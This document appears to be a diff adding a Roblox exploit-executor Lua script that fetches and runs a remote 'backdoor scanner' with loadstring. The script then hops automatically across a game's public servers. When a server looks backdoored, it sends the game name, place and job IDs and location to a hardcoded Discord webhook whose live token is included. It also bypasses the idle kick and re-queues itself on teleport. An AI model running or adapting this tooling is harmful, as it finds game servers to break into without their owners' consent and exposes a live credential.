@@ -1,0 +1,363 @@
+-- [[ GLOBAL CONFIGURATION ]] --
+local success_text = "No backdoored"
+local script_url = "https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/main.lua"
+local self_url = "https://raw.githubusercontent.com/TonyTeardown/scripts/refs/heads/main/bakadtest1"
+local webhook_url = "https://discord.com/api/webhooks/1487289258845802576/dXwi8nw8ptZZNEfWQiVLmBmNs0uSXGOXNRAR8cV_nDlDVJtSuDumUJlYB7_SEzVKiFqx" 
+
+local FinalScript = [===[
+    repeat task.wait() until game:IsLoaded()
+
+    -- [[ INDUSTRIAL CORE SERVICES ]] --
+    local LogService = game:GetService("LogService")
+    local TeleportService = game:GetService("TeleportService")
+    local HttpService = game:GetService("HttpService")
+    local CoreGui = game:GetService("CoreGui")
+    local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
+    local Stats = game:GetService("Stats")
+    local TweenService = game:GetService("TweenService")
+    local RunService = game:GetService("RunService")
+    local LocalPlayer = Players.LocalPlayer
+
+    -- [[ SYSTEM REGISTRY ]] --
+    local found_success = false
+    local scan_completed = false
+    local databaseName = "Scanner_Ultra_v12.json"
+    local currentJobId = tostring(game.JobId)
+    local placeId = tostring(game.PlaceId)
+    local webhook = "]===] .. webhook_url .. [===["
+    local gameName = "Scanning Metadata..."
+    local serverRegion = "Locating..."
+    local startTime = os.time()
+    
+    -- [[ DATA FETCHING: GAME INFO ]] --
+    local function GetGameName()
+        local s, res = pcall(function()
+            return MarketplaceService:GetProductInfo(tonumber(placeId)).Name
+        end)
+        return s and res or "Unknown Experience"
+    end
+    gameName = GetGameName()
+
+    -- [[ THREADED ANTI-AFK SYSTEM ]] --
+    -- Prevents the 20-minute idle kick by simulating user input on the VirtualUser level.
+    task.spawn(function()
+        local VirtualUser = game:GetService("VirtualUser")
+        LocalPlayer.Idled:Connect(function()
+            pcall(function()
+                VirtualUser:CaptureController()
+                VirtualUser:ClickButton2(Vector2.new())
+            end)
+        end)
+    end)
+
+    -- [[ UI ARCHITECTURE - SUPERSONIC INDUSTRIAL v12.0 ]] --
+    local screenGui = Instance.new("ScreenGui", CoreGui)
+    screenGui.Name = "Scanner_Industrial_v12"
+    screenGui.ResetOnSpawn = false
+
+    local mainFrame = Instance.new("Frame", screenGui)
+    mainFrame.Size = UDim2.new(0, 480, 0, 420) 
+    mainFrame.Position = UDim2.new(1, -500, 1, -440)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+    mainFrame.BorderSizePixel = 0
+    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
+    
+    local mainStroke = Instance.new("UIStroke", mainFrame)
+    mainStroke.Color = Color3.fromRGB(0, 255, 150)
+    mainStroke.Thickness = 2
+    mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+    -- Header Section
+    local header = Instance.new("Frame", mainFrame)
+    header.Size = UDim2.new(1, 0, 0, 55)
+    header.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    header.BorderSizePixel = 0
+    Instance.new("UICorner", header).CornerRadius = UDim.new(0, 12)
+
+    local titleText = Instance.new("TextLabel", header)
+    titleText.Size = UDim2.new(1, -25, 1, 0)
+    titleText.Position = UDim2.new(0, 20, 0, 0)
+    titleText.Text = "SUPERSONIC INDUSTRIAL ANALYZER v12.0"
+    titleText.TextColor3 = Color3.fromRGB(0, 255, 150)
+    titleText.BackgroundTransparency = 1
+    titleText.Font = Enum.Font.GothamBold
+    titleText.TextSize = 15
+    titleText.TextXAlignment = Enum.TextXAlignment.Left
+
+    -- Advanced Information Display
+    local statsContainer = Instance.new("Frame", mainFrame)
+    statsContainer.Size = UDim2.new(1, -30, 0, 110)
+    statsContainer.Position = UDim2.new(0, 15, 0, 65)
+    statsContainer.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    Instance.new("UICorner", statsContainer).CornerRadius = UDim.new(0, 8)
+    Instance.new("UIStroke", statsContainer).Color = Color3.fromRGB(35, 35, 35)
+
+    local function createLabel(text, pos, color)
+        local l = Instance.new("TextLabel", statsContainer)
+        l.Size = UDim2.new(0.5, -15, 0, 22)
+        l.Position = pos
+        l.Text = text
+        l.TextColor3 = color or Color3.fromRGB(210, 210, 210)
+        l.BackgroundTransparency = 1
+        l.Font = Enum.Font.GothamSemibold
+        l.TextSize = 11
+        l.TextXAlignment = Enum.TextXAlignment.Left
+        return l
+    end
+
+    local gNameLbl = createLabel("EXPERIENCE: " .. string.sub(gameName, 1, 18), UDim2.new(0, 15, 0, 12))
+    local regLbl = createLabel("REGION: Locating...", UDim2.new(0.5, 5, 0, 12), Color3.fromRGB(255, 180, 0))
+    local pingLbl = createLabel("NETWORK PING: 0ms", UDim2.new(0, 15, 0, 36))
+    local plyrLbl = createLabel("SERVER LOAD: 0/0", UDim2.new(0.5, 5, 0, 36))
+    local depthLbl = createLabel("API PAGE: 0", UDim2.new(0, 15, 0, 60), Color3.fromRGB(0, 180, 255))
+    local uniqueLbl = createLabel("LOGGED (THIS GAME): 0", UDim2.new(0.5, 5, 0, 60), Color3.fromRGB(150, 150, 150))
+    local timeLbl = createLabel("UPTIME: 0s", UDim2.new(0, 15, 0, 84))
+
+    -- Terminal / Logging System
+    local statusIndicator = Instance.new("TextLabel", mainFrame)
+    statusIndicator.Size = UDim2.new(1, -30, 0, 30)
+    statusIndicator.Position = UDim2.new(0, 15, 0, 180)
+    statusIndicator.Text = "STATUS: INITIALIZING DATABASE..."
+    statusIndicator.TextColor3 = Color3.new(1, 1, 1)
+    statusIndicator.BackgroundTransparency = 1
+    statusIndicator.Font = Enum.Font.GothamBold
+    statusIndicator.TextSize = 12
+    statusIndicator.TextXAlignment = Enum.TextXAlignment.Left
+
+    local logScroll = Instance.new("ScrollingFrame", mainFrame)
+    logScroll.Size = UDim2.new(1, -30, 0, 190)
+    logScroll.Position = UDim2.new(0, 15, 0, 210)
+    logScroll.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
+    logScroll.BorderSizePixel = 0
+    logScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+    logScroll.ScrollBarThickness = 3
+    logScroll.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 150)
+    Instance.new("UICorner", logScroll).CornerRadius = UDim.new(0, 8)
+
+    local logList = Instance.new("UIListLayout", logScroll)
+    logList.SortOrder = Enum.SortOrder.LayoutOrder
+    logList.Padding = UDim.new(0, 3)
+
+    local function addLogEntry(msg, col)
+        local entry = Instance.new("TextLabel", logScroll)
+        entry.Size = UDim2.new(1, -10, 0, 18)
+        entry.BackgroundTransparency = 1
+        entry.Text = " [" .. os.date("%X") .. "] " .. msg
+        entry.TextColor3 = col or Color3.fromRGB(230, 230, 230)
+        entry.Font = Enum.Font.Code
+        entry.TextSize = 10
+        entry.TextXAlignment = Enum.TextXAlignment.Left
+        
+        -- Automatic Supersonic Scrolling Logic
+        logScroll.CanvasSize = UDim2.new(0, 0, 0, logList.AbsoluteContentSize.Y + 15)
+        logScroll.CanvasPosition = Vector2.new(0, logList.AbsoluteContentSize.Y)
+    end
+
+    -- [[ REGION DETECTION LOGIC ]] --
+    task.spawn(function()
+        local success, result = pcall(function() 
+            return HttpService:GetAsync("http://ip-api.com/json/") 
+        end)
+        if success and result then
+            local decoded = HttpService:JSONDecode(result)
+            serverRegion = (decoded.city or "Unknown") .. ", " .. (decoded.countryCode or "??")
+            regLbl.Text = "REGION: " .. serverRegion
+            addLogEntry("Server Geolocation: " .. serverRegion, Color3.fromRGB(255, 180, 0))
+        end
+    end)
+
+    -- [[ PLACE-EXCLUSIVE DATABASE CONTROLLER ]] --
+    local function GetMasterDatabase()
+        addLogEntry("Synchronizing database file...", Color3.new(1, 1, 1))
+        local ok, data = pcall(function()
+            if isfile(databaseName) then 
+                return HttpService:JSONDecode(readfile(databaseName)) 
+            end
+        end)
+        
+        local master = (ok and type(data) == "table") and data or {}
+        
+        -- Initialize unique entry for THIS game only
+        if not master[placeId] then
+            master[placeId] = {}
+            addLogEntry("New Place detected. Isolating ID pool for: " .. placeId, Color3.fromRGB(0, 180, 255))
+        end
+        
+        uniqueLbl.Text = "LOGGED (THIS GAME): " .. #master[placeId]
+        return master
+    end
+
+    local GlobalData = GetMasterDatabase()
+    local CurrentGameIDs = GlobalData[placeId]
+
+    local function CommitToServerLog(id)
+        local sid = tostring(id)
+        local foundInThisGame = false
+        
+        -- STRICT CHECK: Only check against IDs found in this specific PlaceID
+        for _, storedId in pairs(CurrentGameIDs) do
+            if storedId == sid then foundInThisGame = true break end
+        end
+        
+        if not foundInThisGame then
+            table.insert(CurrentGameIDs, sid)
+            GlobalData[placeId] = CurrentGameIDs
+            pcall(function() 
+                writefile(databaseName, HttpService:JSONEncode(GlobalData)) 
+            end)
+            uniqueLbl.Text = "LOGGED (THIS GAME): " .. #CurrentGameIDs
+            addLogEntry("ID Registered to Place " .. placeId .. ": .." .. string.sub(sid, -8), Color3.fromRGB(140, 140, 140))
+        end
+    end
+
+    -- Mark current server immediately
+    CommitToServerLog(currentJobId)
+
+    -- [[ WEBHOOK DISPATCHER ]] --
+    local function DispatchWebhook(msg)
+        if webhook == "" or webhook == "YOUR_WEBHOOK_HERE" then return end
+        local embed = {
+            ["username"] = "Industrial Scanner Pro v12",
+            ["embeds"] = {{
+                ["title"] = "🚨 BACKDOOR DETECTED!",
+                ["description"] = msg,
+                ["color"] = 16711680,
+                ["fields"] = {
+                    {["name"] = "Experience", ["value"] = gameName, ["inline"] = true},
+                    {["name"] = "Place ID", ["value"] = placeId, ["inline"] = true},
+                    {["name"] = "Job ID", ["value"] = "```" .. currentJobId .. "```", ["inline"] = false},
+                    {["name"] = "Location", ["value"] = serverRegion, ["inline"] = true}
+                },
+                ["footer"] = {["text"] = "Supersonic Scan Logic Active"}
+            }}
+        }
+        pcall(function()
+            local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
+            req({
+                Url = webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(embed)
+            })
+        end)
+    end
+
+    -- [[ MAIN SCANNER MODULE ]] --
+    local logMonitor
+    logMonitor = LogService.MessageOut:Connect(function(msg)
+        local text = msg:lower()
+        if string.find(text, "]===] .. success_text:lower() .. [===[" , 1, true) then found_success = true end
+        if string.find(text, "complete") or string.find(text, "finished") then scan_completed = true end
+    end)
+
+    addLogEntry("Injecting loadstring target...", Color3.new(1, 1, 1))
+    pcall(function()
+        loadstring(game:HttpGet("]===] .. script_url .. [===["))()
+    end)
+
+    -- UI Update Thread
+    task.spawn(function()
+        while task.wait(0.5) do
+            pcall(function()
+                pingLbl.Text = "NETWORK PING: " .. math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) .. "ms"
+                plyrLbl.Text = "SERVER LOAD: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers
+                timeLbl.Text = "UPTIME: " .. (os.time() - startTime) .. "s"
+            end)
+        end
+    end)
+
+    local waitTime = 0
+    while waitTime < 40 do
+        if found_success then break end
+        if scan_completed and waitTime > 5 then break end
+        waitTime = waitTime + 1
+        statusIndicator.Text = "STATUS: SCANNING NETWORK... [" .. waitTime .. "s]"
+        task.wait(1)
+    end
+    logMonitor:Disconnect()
+
+    -- [[ SUPERSONIC RECURSIVE HOPPER ]] --
+    if found_success then
+        addLogEntry("CLEAN SCAN. COMMENCING SUPERSONIC RE-LOCATION...", Color3.fromRGB(0, 255, 100))
+        statusIndicator.Text = "STATUS: SAFE. SEARCHING NEW TARGETS..."
+        
+        local function ExecuteSupersonicHop()
+            -- Prepare teleport queue
+            local q = (syn and syn.queue_on_teleport) or (queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
+            if q then pcall(function() q(game:HttpGet("]===] .. self_url .. [===[")) end) end
+
+            local currentCursor = ""
+            local currentPage = 0
+            
+            while true do
+                currentPage = currentPage + 1
+                depthLbl.Text = "API PAGE: " .. currentPage
+                addLogEntry("Supersonic Probe: Page " .. currentPage, Color3.fromRGB(0, 180, 255))
+                
+                local api_url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"
+                if currentCursor ~= "" then api_url = api_url .. "&cursor=" .. currentCursor end
+                
+                local success, response = pcall(function() return game:HttpGet(api_url) end)
+                if success and response then
+                    local decoded = HttpService:JSONDecode(response)
+                    if decoded and decoded.data then
+                        for _, server in pairs(decoded.data) do
+                            local id = tostring(server.id)
+                            -- Check capacity and check against THIS GAME'S specific ID list
+                            if server.playing < server.maxPlayers and id ~= currentJobId then
+                                local isVisited = false
+                                for _, loggedId in pairs(CurrentGameIDs) do
+                                    if id == loggedId then isVisited = true break end
+                                end
+                                
+                                if not isVisited then
+                                    addLogEntry("TARGET ACQUIRED ON PAGE " .. currentPage .. "!", Color3.fromRGB(0, 255, 100))
+                                    CommitToServerLog(id)
+                                    statusIndicator.Text = "STATUS: TELEPORTING TO NEW INSTANCE..."
+                                    task.wait(0.1)
+                                    TeleportService:TeleportToPlaceInstance(tonumber(placeId), id, LocalPlayer)
+                                    task.wait(7) -- Standard safety margin for engine handoff
+                                end
+                            end
+                        end
+
+                        -- Pagination Logic
+                        if decoded.nextPageCursor and decoded.nextPageCursor ~= "" then
+                            currentCursor = decoded.nextPageCursor
+                            task.wait(0.05) -- Supersonic: Minimal wait between API calls
+                        else
+                            addLogEntry("Full Scan Finished. Re-indexing in 10s...", Color3.fromRGB(255, 150, 0))
+                            currentCursor = ""
+                            currentPage = 0
+                            task.wait(10)
+                        end
+                    end
+                else
+                    addLogEntry("API THROTTLE DETECTED. Cooling down 15s.", Color3.new(1, 0, 0))
+                    task.wait(15)
+                end
+                task.wait(0.05)
+            end
+        end
+        ExecuteSupersonicHop()
+    else
+        statusIndicator.Text = "STATUS: !!! SECURITY HIT DETECTED !!!"
+        statusIndicator.TextColor3 = Color3.fromRGB(255, 50, 50)
+        mainStroke.Color = Color3.fromRGB(255, 50, 50)
+        addLogEntry("CRITICAL: Backdoor patterns confirmed.", Color3.new(1, 0, 0))
+        DispatchWebhook("Manual intervention required. No safety confirmation during scan.")
+        
+        -- Pulse UI Alert
+        task.spawn(function()
+            while true do
+                mainStroke.Thickness = 5
+                task.wait(0.6)
+                mainStroke.Thickness = 1
+                task.wait(0.6)
+            end
+        end)
+    end
+]===]
+
+loadstring(FinalScript)()
